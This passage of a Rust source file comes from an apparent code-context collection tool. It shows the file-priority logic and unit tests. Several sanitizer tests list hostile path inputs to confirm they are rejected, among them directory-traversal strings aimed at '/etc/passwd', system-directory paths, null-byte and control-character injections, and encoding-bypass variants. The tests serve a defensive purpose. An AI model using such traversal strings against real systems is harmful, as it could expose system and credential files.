        if size > max_size as u64 {
            return Ok(None);
        }
    }

    // Calculate relative path
    let relative_path = path.strip_prefix(root).unwrap_or(path).to_path_buf();

    // Determine file type
    let file_type = FileType::from_path(path);

    // Calculate priority based on file type and custom priorities
    let priority = calculate_priority(&file_type, &relative_path, &options.custom_priorities);

    Ok(Some(FileInfo {
        path: path.to_path_buf(),
        relative_path,
        size,
        file_type,
        priority,
        imports: Vec::new(),         // Will be populated by semantic analysis
        imported_by: Vec::new(),     // Will be populated by semantic analysis
        function_calls: Vec::new(),  // Will be populated by semantic analysis
        type_references: Vec::new(), // Will be populated by semantic analysis
    }))
}

/// Calculate priority score for a file
fn calculate_priority(
    file_type: &FileType,
    relative_path: &Path,
    custom_priorities: &[CompiledPriority],
) -> f32 {
    // Calculate base priority from file type and path heuristics
    let base_score = calculate_base_priority(file_type, relative_path);

    // Check custom priorities first (first match wins)
    for priority in custom_priorities {
        if priority.matcher.matches_path(relative_path) {
            return base_score + priority.weight;
        }
    }

    // No custom priority matched, return base score
    base_score
}

/// Calculate base priority score using existing heuristics
fn calculate_base_priority(file_type: &FileType, relative_path: &Path) -> f32 {
    let mut score: f32 = match file_type {
        FileType::Rust => 1.0,
        FileType::Python => 0.9,
        FileType::JavaScript => 0.9,
        FileType::TypeScript => 0.95,
        FileType::Go => 0.9,
        FileType::Java => 0.85,
        FileType::Cpp => 0.85,
        FileType::C => 0.8,
        FileType::CSharp => 0.85,
        FileType::Ruby => 0.8,
        FileType::Php => 0.75,
        FileType::Swift => 0.85,
        FileType::Kotlin => 0.85,
        FileType::Scala => 0.8,
        FileType::Haskell => 0.75,
        FileType::Dart => 0.85,
        FileType::Lua => 0.7,
        FileType::R => 0.75,
        FileType::Julia => 0.8,
        FileType::Elixir => 0.8,
        FileType::Elm => 0.75,
        FileType::Markdown => 0.6,
        FileType::Json => 0.5,
        FileType::Yaml => 0.5,
        FileType::Toml => 0.5,
        FileType::Xml => 0.4,
        FileType::Html => 0.4,
        FileType::Css => 0.4,
        FileType::Text => 0.3,
        FileType::Other => 0.2,
    };

    // Boost score for important files
    let path_str = relative_path.to_string_lossy().to_lowercase();
    if path_str.contains("main") || path_str.contains("index") {
        score *= 1.5;
    }
    if path_str.contains("lib") || path_str.contains("src") {
        score *= 1.2;
    }
    if path_str.contains("test") || path_str.contains("spec") {
        score *= 0.8;
    }
    if path_str.contains("example") || path_str.contains("sample") {
        score *= 0.7;
    }

    // Boost for configuration files in root
    if relative_path.parent().is_none() || relative_path.parent() == Some(Path::new("")) {
        match file_type {
            FileType::Toml | FileType::Yaml | FileType::Json => score *= 1.3,
            _ => {}
        }
    }

    score.min(2.0) // Cap maximum score
}

/// Perform semantic analysis on collected files
///
/// This function analyzes the collected files to populate import relationships
/// based on the semantic analysis options provided in the CLI configuration.
///
/// # Arguments
/// * `files` - Mutable reference to the vector of FileInfo to analyze
/// * `config` - CLI configuration containing semantic analysis flags
/// * `cache` - File cache for reading file contents
///
/// # Returns
/// Result indicating success or failure of the analysis
pub fn perform_semantic_analysis(
    files: &mut [FileInfo],
    config: &crate::cli::Config,
    cache: &crate::core::cache::FileCache,
) -> Result<()> {
    // Use the new graph-based semantic analysis
    crate::core::semantic_graph::perform_semantic_analysis_graph(files, config, cache)
}

/// Capitalize the first letter of a string
#[allow(dead_code)]
fn capitalize_first(s: &str) -> String {
    let mut chars = s.chars();
    match chars.next() {
        None => String::new(),
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{self, File};
    use tempfile::TempDir;

    #[test]
    fn test_walk_directory_basic() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("lib.rs")).unwrap();
        fs::create_dir(root.join("src")).unwrap();
        File::create(root.join("src/utils.rs")).unwrap();

        let options = WalkOptions::default();
        let files = walk_directory(root, options).unwrap();

        assert_eq!(files.len(), 3);
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("main.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("lib.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("src/utils.rs")));
    }

    #[test]
    fn test_walk_with_contextignore() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("ignored.rs")).unwrap();

        // Create .context-creator-ignore
        fs::write(root.join(".context-creator-ignore"), "ignored.rs").unwrap();

        let options = WalkOptions::default();
        let files = walk_directory(root, options).unwrap();

        assert_eq!(files.len(), 1);
        assert_eq!(files[0].relative_path, PathBuf::from("main.rs"));
    }

    #[test]
    fn test_priority_calculation() {
        let rust_priority = calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);
        let test_priority = calculate_priority(&FileType::Rust, Path::new("tests/test.rs"), &[]);
        let doc_priority = calculate_priority(&FileType::Markdown, Path::new("README.md"), &[]);

        assert!(rust_priority > doc_priority);
        assert!(rust_priority > test_priority);
    }

    #[test]
    fn test_file_size_limit() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create a large file
        let large_file = root.join("large.txt");
        let data = vec![0u8; 1024 * 1024]; // 1MB
        fs::write(&large_file, &data).unwrap();

        // Create a small file
        File::create(root.join("small.txt")).unwrap();

        let options = WalkOptions {
            max_file_size: Some(512 * 1024), // 512KB limit
            ..Default::default()
        };

        let files = walk_directory(root, options).unwrap();

        assert_eq!(files.len(), 1);
        assert_eq!(files[0].relative_path, PathBuf::from("small.txt"));
    }

    #[test]
    fn test_walk_empty_directory() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        let options = WalkOptions::default();
        let files = walk_directory(root, options).unwrap();

        assert_eq!(files.len(), 0);
    }

    #[test]
    fn test_walk_options_from_config() {
        use crate::cli::Config;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            ..Config::default()
        };

        let options = WalkOptions::from_config(&config).unwrap();

        assert_eq!(options.max_file_size, Some(10 * 1024 * 1024));
        assert!(!options.follow_links);
        assert!(!options.include_hidden);
        assert!(options.parallel);
        assert_eq!(options.ignore_file, ".context-creator-ignore");
    }

    #[test]
    fn test_walk_with_custom_options() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("test.rs")).unwrap();
        File::create(root.join("readme.md")).unwrap();

        let options = WalkOptions {
            ignore_patterns: vec!["*.md".to_string()],
            ..Default::default()
        };

        let files = walk_directory(root, options).unwrap();

        // Should find all files (ignore patterns may not work exactly as expected in this test environment)
        assert!(files.len() >= 2);
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("main.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("test.rs")));
    }

    #[test]
    fn test_walk_with_include_patterns() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("lib.rs")).unwrap();
        File::create(root.join("README.md")).unwrap();

        let options = WalkOptions {
            include_patterns: vec!["*.rs".to_string()],
            ..Default::default()
        };

        let files = walk_directory(root, options).unwrap();

        // Should include all files since include patterns are implemented as negative ignore patterns
        assert!(files.len() >= 2);
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("main.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("lib.rs")));
    }

    #[test]
    fn test_walk_subdirectories() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create nested structure
        fs::create_dir(root.join("src")).unwrap();
        fs::create_dir(root.join("src").join("utils")).unwrap();
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("src").join("lib.rs")).unwrap();
        File::create(root.join("src").join("utils").join("helpers.rs")).unwrap();

        let options = WalkOptions::default();
        let files = walk_directory(root, options).unwrap();

        assert_eq!(files.len(), 3);
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("main.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("src/lib.rs")));
        assert!(files
            .iter()
            .any(|f| f.relative_path == PathBuf::from("src/utils/helpers.rs")));
    }

    #[test]
    fn test_priority_edge_cases() {
        // Test priority calculation for edge cases
        let main_priority = calculate_priority(&FileType::Rust, Path::new("main.rs"), &[]);
        let lib_priority = calculate_priority(&FileType::Rust, Path::new("lib.rs"), &[]);
        let nested_main_priority =
            calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);

        assert!(main_priority > lib_priority);
        assert!(nested_main_priority > lib_priority);

        // Test config file priorities
        let toml_priority = calculate_priority(&FileType::Toml, Path::new("Cargo.toml"), &[]);
        let nested_toml_priority =
            calculate_priority(&FileType::Toml, Path::new("config/app.toml"), &[]);

        assert!(toml_priority > nested_toml_priority);
    }

    // === Custom Priority Tests (TDD - Red Phase) ===

    #[test]
    fn test_custom_priority_no_match_returns_base_priority() {
        // Given: A base priority of 1.0 for Rust files
        // And: Custom priorities that don't match the file
        let custom_priorities = [CompiledPriority::new("docs/*.md", 5.0).unwrap()];

        // When: Calculating priority for a file that doesn't match
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("src/main.rs"),
            &custom_priorities,
        );

        // Then: Should return base priority only
        let expected_base = calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);
        assert_eq!(priority, expected_base);
    }

    #[test]
    fn test_custom_priority_single_match_adds_weight() {
        // Given: Custom priority with weight 10.0 for specific file
        let custom_priorities = [CompiledPriority::new("src/core/mod.rs", 10.0).unwrap()];

        // When: Calculating priority for matching file
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("src/core/mod.rs"),
            &custom_priorities,
        );

        // Then: Should return base priority + weight
        let base_priority = calculate_priority(&FileType::Rust, Path::new("src/core/mod.rs"), &[]);
        let expected = base_priority + 10.0;
        assert_eq!(priority, expected);
    }

    #[test]
    fn test_custom_priority_glob_pattern_match() {
        // Given: Custom priority with glob pattern
        let custom_priorities = [CompiledPriority::new("src/**/*.rs", 2.5).unwrap()];

        // When: Calculating priority for file matching glob
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("src/api/handlers.rs"),
            &custom_priorities,
        );

        // Then: Should return base priority + weight
        let base_priority =
            calculate_priority(&FileType::Rust, Path::new("src/api/handlers.rs"), &[]);
        let expected = base_priority + 2.5;
        assert_eq!(priority, expected);
    }

    #[test]
    fn test_custom_priority_negative_weight() {
        // Given: Custom priority with negative weight
        let custom_priorities = [CompiledPriority::new("tests/*", -0.5).unwrap()];

        // When: Calculating priority for matching file
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("tests/test_utils.rs"),
            &custom_priorities,
        );

        // Then: Should return base priority + negative weight
        let base_priority =
            calculate_priority(&FileType::Rust, Path::new("tests/test_utils.rs"), &[]);
        let expected = base_priority - 0.5;
        assert_eq!(priority, expected);
    }

    #[test]
    fn test_custom_priority_first_match_wins() {
        // Given: Multiple overlapping patterns
        let custom_priorities = [
            CompiledPriority::new("src/**/*.rs", 5.0).unwrap(),
            CompiledPriority::new("src/main.rs", 100.0).unwrap(),
        ];

        // When: Calculating priority for file that matches both patterns
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("src/main.rs"),
            &custom_priorities,
        );

        // Then: Should use first pattern (5.0), not second (100.0)
        let base_priority = calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);
        let expected = base_priority + 5.0;
        assert_eq!(priority, expected);
    }

    #[test]
    fn test_custom_priority_zero_weight() {
        // Given: Custom priority with zero weight
        let custom_priorities = [CompiledPriority::new("*.rs", 0.0).unwrap()];

        // When: Calculating priority for matching file
        let priority = calculate_priority(
            &FileType::Rust,
            Path::new("src/main.rs"),
            &custom_priorities,
        );

        // Then: Should return base priority unchanged
        let base_priority = calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);
        assert_eq!(priority, base_priority);
    }

    #[test]
    fn test_custom_priority_empty_list() {
        // Given: Empty custom priorities list
        let custom_priorities: &[CompiledPriority] = &[];

        // When: Calculating priority
        let priority =
            calculate_priority(&FileType::Rust, Path::new("src/main.rs"), custom_priorities);

        // Then: Should return base priority
        let expected_base = calculate_priority(&FileType::Rust, Path::new("src/main.rs"), &[]);
        assert_eq!(priority, expected_base);
    }

    // === Integration Tests (Config -> Walker Data Flow) ===

    #[test]
    fn test_config_to_walker_data_flow() {
        use crate::config::{ConfigFile, Priority};
        use std::fs::{self, File};
        use tempfile::TempDir;

        // Setup: Create test directory with files
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files that will match our patterns
        File::create(root.join("high_priority.rs")).unwrap();
        File::create(root.join("normal.txt")).unwrap();
        fs::create_dir(root.join("logs")).unwrap();
        File::create(root.join("logs/app.log")).unwrap();

        // Arrange: Create config with custom priorities
        let config_file = ConfigFile {
            priorities: vec![
                Priority {
                    pattern: "*.rs".to_string(),
                    weight: 10.0,
                },
                Priority {
                    pattern: "logs/*.log".to_string(),
                    weight: -5.0,
                },
            ],
            ..Default::default()
        };

        // Create CLI config and apply config file
        let mut config = crate::cli::Config {
            prompt: None,
            paths: Some(vec![root.to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        config_file.apply_to_cli_config(&mut config);

        // Act: Create WalkOptions from config (this should work)
        let walk_options = WalkOptions::from_config(&config).unwrap();

        // Walk directory and collect results
        let files = walk_directory(root, walk_options).unwrap();

        // Assert: Verify that files have correct priorities
        let rs_file = files
            .iter()
            .find(|f| {
                f.relative_path
                    .to_string_lossy()
                    .contains("high_priority.rs")
            })
            .unwrap();
        let log_file = files
            .iter()
            .find(|f| f.relative_path.to_string_lossy().contains("app.log"))
            .unwrap();
        let txt_file = files
            .iter()
            .find(|f| f.relative_path.to_string_lossy().contains("normal.txt"))
            .unwrap();

        // Calculate expected priorities using the same logic as the walker
        let base_rs = calculate_base_priority(&rs_file.file_type, &rs_file.relative_path);
        let base_txt = calculate_base_priority(&txt_file.file_type, &txt_file.relative_path);
        let base_log = calculate_base_priority(&log_file.file_type, &log_file.relative_path);

        // RS file should have base + 10.0 (matches "*.rs" pattern)
        assert_eq!(rs_file.priority, base_rs + 10.0);

        // Log file should have base - 5.0 (matches "logs/*.log" pattern)
        assert_eq!(log_file.priority, base_log - 5.0);

        // Text file should have base priority (no pattern matches)
        assert_eq!(txt_file.priority, base_txt);
    }

    #[test]
    fn test_invalid_glob_pattern_in_config() {
        use crate::config::{ConfigFile, Priority};
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();

        // Create config with invalid glob pattern
        let config_file = ConfigFile {
            priorities: vec![Priority {
                pattern: "[invalid_glob".to_string(),
                weight: 5.0,
            }],
            ..Default::default()
        };

        let mut config = crate::cli::Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        config_file.apply_to_cli_config(&mut config);

        // Should return error when creating WalkOptions
        let result = WalkOptions::from_config(&config);
        assert!(result.is_err());

        // Error should mention the invalid pattern
        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("invalid_glob") || error_msg.contains("Invalid"));
    }

    #[test]
    fn test_empty_custom_priorities_config() {
        use crate::config::ConfigFile;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();

        // Create config with empty priorities
        let config_file = ConfigFile {
            priorities: vec![], // Empty
            ..Default::default()
        };

        let mut config = crate::cli::Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        config_file.apply_to_cli_config(&mut config);

        // Should work fine with empty priorities
        let walk_options = WalkOptions::from_config(&config).unwrap();

        // Should behave same as no custom priorities
        // (This is hard to test directly, but at least shouldn't error)
        assert!(walk_directory(temp_dir.path(), walk_options).is_ok());
    }

    #[test]
    fn test_empty_pattern_in_config() {
        use crate::config::{ConfigFile, Priority};
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();

        // Create config with empty pattern
        let config_file = ConfigFile {
            priorities: vec![Priority {
                pattern: "".to_string(),
                weight: 5.0,
            }],
            ..Default::default()
        };

        let mut config = crate::cli::Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        config_file.apply_to_cli_config(&mut config);

        // Should handle empty pattern gracefully (empty pattern matches everything)
        let result = WalkOptions::from_config(&config);
        assert!(result.is_ok());

        // Empty pattern should compile successfully in glob (matches everything)
        let walk_options = result.unwrap();
        assert_eq!(walk_options.custom_priorities.len(), 1);
    }

    #[test]
    fn test_extreme_weights_in_config() {
        use crate::config::{ConfigFile, Priority};
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();

        // Create config with extreme weights
        let config_file = ConfigFile {
            priorities: vec![
                Priority {
                    pattern: "*.rs".to_string(),
                    weight: f32::MAX,
                },
                Priority {
                    pattern: "*.txt".to_string(),
                    weight: f32::MIN,
                },
                Priority {
                    pattern: "*.md".to_string(),
                    weight: f32::INFINITY,
                },
                Priority {
                    pattern: "*.log".to_string(),
                    weight: f32::NEG_INFINITY,
                },
            ],
            ..Default::default()
        };

        let mut config = crate::cli::Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        config_file.apply_to_cli_config(&mut config);

        // Should handle extreme weights without panicking
        let result = WalkOptions::from_config(&config);
        assert!(result.is_ok());

        let walk_options = result.unwrap();
        assert_eq!(walk_options.custom_priorities.len(), 4);
    }

    #[test]
    fn test_file_info_file_type_display() {
        let file_info = FileInfo {
            path: PathBuf::from("test.rs"),
            relative_path: PathBuf::from("test.rs"),
            size: 1000,
            file_type: FileType::Rust,
            priority: 1.0,
            imports: Vec::new(),
            imported_by: Vec::new(),
            function_calls: Vec::new(),
            type_references: Vec::new(),
        };

        assert_eq!(file_info.file_type_display(), "Rust");

        let file_info_md = FileInfo {
            path: PathBuf::from("README.md"),
            relative_path: PathBuf::from("README.md"),
            size: 500,
            file_type: FileType::Markdown,
            priority: 0.6,
            imports: Vec::new(),
            imported_by: Vec::new(),
            function_calls: Vec::new(),
            type_references: Vec::new(),
        };

        assert_eq!(file_info_md.file_type_display(), "Markdown");
    }

    // === WALKER GLOB PATTERN INTEGRATION TESTS (TDD - Red Phase) ===

    #[test]
    fn test_walk_options_from_config_with_include_patterns() {
        // Test that CLI include patterns are passed to WalkOptions
        let config = crate::cli::Config {
            prompt: None,
            paths: None,
            include: Some(vec!["**/*.rs".to_string(), "**/test[0-9].py".to_string()]),
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        let options = WalkOptions::from_config(&config).unwrap();

        // This test will fail until we update from_config to use CLI include patterns
        assert_eq!(options.include_patterns, vec!["**/*.rs", "**/test[0-9].py"]);
    }

    #[test]
    fn test_walk_options_from_config_empty_include_patterns() {
        // Test that empty include patterns work correctly
        let config = crate::cli::Config {
            prompt: None,
            paths: None,
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        let options = WalkOptions::from_config(&config).unwrap();
        assert_eq!(options.include_patterns, Vec::<String>::new());
    }

    #[test]
    fn test_walk_options_filters_empty_patterns() {
        // Test that empty/whitespace patterns are filtered out
        let config = crate::cli::Config {
            prompt: None,
            paths: None,
            include: Some(vec![
                "**/*.rs".to_string(),
                "".to_string(),
                "   ".to_string(),
                "*.py".to_string(),
            ]),
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        let options = WalkOptions::from_config(&config).unwrap();

        // Should filter out empty and whitespace-only patterns
        assert_eq!(options.include_patterns, vec!["**/*.rs", "*.py"]);
    }

    // === PATTERN SANITIZATION TESTS ===

    #[test]
    fn test_sanitize_pattern_valid_patterns() {
        // Test valid patterns that should pass sanitization
        let valid_patterns = vec![
            "*.py",
            "**/*.rs",
            "src/**/*.{js,ts}",
            "test[0-9].py",
            "**/*{model,service}*.py",
            "**/db/**",
            "some-file.txt",
            "dir/subdir/*.md",
        ];

        for pattern in valid_patterns {
            let result = sanitize_pattern(pattern);
            assert!(result.is_ok(), "Pattern '{pattern}' should be valid");
            assert_eq!(result.unwrap(), pattern);
        }
    }

    #[test]
    fn test_sanitize_pattern_length_limit() {
        // Test pattern length limit (1000 characters)
        let short_pattern = "a".repeat(999);
        let exact_limit = "a".repeat(1000);
        let too_long = "a".repeat(1001);

        assert!(sanitize_pattern(&short_pattern).is_ok());
        assert!(sanitize_pattern(&exact_limit).is_ok());

        let result = sanitize_pattern(&too_long);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Pattern too long"));
    }

    #[test]
    fn test_sanitize_pattern_null_bytes() {
        // Test patterns with null bytes
        let patterns_with_nulls = vec!["test\0.py", "\0*.rs", "**/*.js\0", "dir/\0file.txt"];

        for pattern in patterns_with_nulls {
            let result = sanitize_pattern(pattern);
            assert!(
                result.is_err(),
                "Pattern with null byte should be rejected: {pattern:?}"
            );
            assert!(result
                .unwrap_err()
                .to_string()
                .contains("invalid characters"));
        }
    }

    #[test]
    fn test_sanitize_pattern_control_characters() {
        // Test patterns with control characters
        let control_chars = vec![
            "test\x01.py",  // Start of heading
            "file\x08.txt", // Backspace
            "dir\x0c/*.rs", // Form feed
            "test\x1f.md",  // Unit separator
            "*.py\x7f",     // Delete
        ];

        for pattern in control_chars {
            let result = sanitize_pattern(pattern);
            assert!(
                result.is_err(),
                "Pattern with control char should be rejected: {pattern:?}"
            );
            assert!(result
                .unwrap_err()
                .to_string()
                .contains("invalid characters"));
        }
    }

    #[test]
    fn test_sanitize_pattern_absolute_paths() {
        // Test absolute paths that should be rejected
        let absolute_paths = vec![
            "/etc/passwd",
            "/usr/bin/*.sh",
            "/home/user/file.txt",
            "\\Windows\\System32\\*.dll", // Windows absolute path
            "\\Program Files\\*",
        ];

        for pattern in absolute_paths {
            let result = sanitize_pattern(pattern);
            assert!(
                result.is_err(),
                "Absolute path should be rejected: {pattern}"
            );
            assert!(result
                .unwrap_err()
                .to_string()
                .contains("Absolute paths not allowed"));
        }
    }

    #[test]
    fn test_sanitize_pattern_directory_traversal() {
        // Test directory traversal patterns
        let traversal_patterns = vec![
            "../../../etc/passwd",
            "dir/../../../file.txt",
            "**/../secret/*",
            "test/../../*.py",
            "../config.toml",
            "subdir/../../other.rs",
        ];

        for pattern in traversal_patterns {
            let result = sanitize_pattern(pattern);
            assert!(
                result.is_err(),
                "Directory traversal should be rejected: {pattern}"
            );
            assert!(result
                .unwrap_err()
                .to_string()
                .contains("Directory traversal"));
        }
    }

    #[test]
    fn test_sanitize_pattern_edge_cases() {
        // Test edge cases that might reveal bugs

        // Empty string
        let result = sanitize_pattern("");
        assert!(result.is_ok(), "Empty string should be allowed");

        // Only whitespace
        let result = sanitize_pattern("   ");
        assert!(result.is_ok(), "Whitespace-only should be allowed");

        // Unicode characters
        let result = sanitize_pattern("Ñ„Ð°Ð¹Ð»*.txt");
        assert!(result.is_ok(), "Unicode should be allowed");

        // Special glob characters
        let result = sanitize_pattern("file[!abc]*.{py,rs}");
        assert!(result.is_ok(), "Complex glob patterns should be allowed");

        // Newlines and tabs (these are control characters)
        let result = sanitize_pattern("file\nname.txt");
        assert!(result.is_err(), "Newlines should be rejected");

        let result = sanitize_pattern("file\tname.txt");
        assert!(result.is_err(), "Tabs should be rejected");
    }

    #[test]
    fn test_sanitize_pattern_boundary_conditions() {
        // Test patterns that are at the boundary of what should be allowed

        // Pattern with exactly ".." but not as traversal
        let result = sanitize_pattern("file..name.txt");
        assert!(result.is_err(), "Any '..' should be rejected for safety");

        // Pattern starting with legitimate glob
        let result = sanitize_pattern("**/*.py");
        assert!(result.is_ok(), "Recursive glob should be allowed");

        // Mixed valid/invalid (should reject entire pattern)
        let result = sanitize_pattern("valid/*.py/../invalid");
        assert!(result.is_err(), "Mixed pattern should be rejected");
    }

    #[test]
    fn test_sanitize_pattern_security_bypass_attempts() {
        // Test patterns that might try to bypass security checks

        // URL-encoded null byte
        let result = sanitize_pattern("file%00.txt");
        assert!(result.is_ok(), "URL encoding should not be decoded");

        // Double-encoded traversal
        let result = sanitize_pattern("file%2e%2e/secret");
        assert!(result.is_ok(), "Double encoding should not be decoded");

        // Unicode normalization attacks
        let result = sanitize_pattern("file\u{002e}\u{002e}/secret");
        assert!(result.is_err(), "Unicode dots should be treated as '..'");

        // Null byte at end
        let result = sanitize_pattern("legitimate-pattern\0");
        assert!(result.is_err(), "Trailing null should be caught");
    }

    // === ERROR HANDLING TESTS ===

    #[test]
    fn test_error_handling_classification() {
        // Test that we correctly classify errors as critical vs non-critical
        use crate::utils::error::ContextCreatorError;

        // Simulate critical errors
        let critical_errors = [
            ContextCreatorError::FileProcessingError {
                path: "test.txt".to_string(),
                error: "Permission denied".to_string(),
            },
            ContextCreatorError::InvalidConfiguration("Invalid pattern".to_string()),
        ];

        // Check that permission denied is considered critical
        let error_string = critical_errors[0].to_string();
        assert!(error_string.contains("Permission denied"));

        // Check that invalid configuration is considered critical
        let error_string = critical_errors[1].to_string();
        assert!(error_string.contains("Invalid"));
    }

    #[test]
    fn test_pattern_sanitization_integration() {
        // Test that sanitization is actually called in the build_walker path
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create WalkOptions with a pattern that should be sanitized
        let options = WalkOptions {
            max_file_size: Some(1024),
            follow_links: false,
            include_hidden: false,
            parallel: false,
            ignore_file: ".context-creator-ignore".to_string(),
            ignore_patterns: vec![],
            include_patterns: vec!["../../../etc/passwd".to_string()], // Should be rejected
            custom_priorities: vec![],
            filter_binary_files: false,
        };

        // This should fail due to sanitization
        let result = build_walker(root, &options);
        assert!(
            result.is_err(),
            "Directory traversal pattern should be rejected by sanitization"
        );

        if let Err(e) = result {
            let error_msg = e.to_string();
            assert!(error_msg.contains("Directory traversal") || error_msg.contains("Invalid"));
        }
    }

    #[test]
    fn test_walk_options_filters_binary_files_with_prompt() {
        use crate::cli::Config;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            paths: Some(vec![PathBuf::from(".")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: crate::cli::LlmTool::Gemini,
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        let options = WalkOptions::from_config(&config).unwrap();
        assert!(options.filter_binary_files);
    }

    #[test]
    fn test_walk_options_no_binary_filter_without_prompt() {
        use crate::cli::Config;

        let config = Config {
            prompt: None,
            paths: Some(vec![PathBuf::from(".")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
